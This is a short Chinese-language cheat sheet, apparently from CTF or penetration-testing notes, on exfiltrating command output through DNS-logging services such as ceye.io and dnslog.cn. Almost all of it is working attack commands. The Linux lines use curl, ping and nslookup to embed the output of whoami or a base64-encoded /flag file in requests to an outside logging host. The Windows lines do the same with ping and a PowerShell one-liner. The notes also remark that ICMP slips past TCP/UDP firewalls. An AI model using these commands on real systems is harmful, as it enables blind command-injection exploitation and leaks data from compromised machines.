myDNSlog：
2qytvx.ceye.io
可获取出网ip和 DNS的url记录和 请求的url记录。
发起DNS请求可以顺带携带出参数。
而ping位于运输层下面icmp协议，不受一般tcp/udp层的防火墙拦截，只会有DNS请求纪录。
 <http://dnslog.cn>
<http://ceye.io>
<http://admin.dnslog.link>



### 1. linux:

```
curl http://ip.port.b182oj.ceye.io/`whoami` 
curl http://ip.port.b182oj.ceye.io/`cat /flag|base64` 
curl http://2qytvx.ceye.io/?r=$(cat /flag)

linux会先执行whoami,再ping,curl


ping `whoami`.ip.port.2qytvx.ceye.io
ping对域名比较严格，域名不能有{}，==，\，/
找不到主机:
{666}.2qytvx.ceye.io
2qytvx.ceye.io/{666}


nslookup `cat /flag|base64`.2qytvx.ceye.io
转成base64携带
```

### 2. windows
携带系统变量
```
ping %USERNAME%.2qytvx.ceye.io
```
不使用cmd使用win7后自带的powershell可以自定义变量：
```
powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.2qytvx.ceye.io';$z=$x+$y;ping $z
```
ping对域名比较严格，域名不能有/。这里将/替换成xxx了。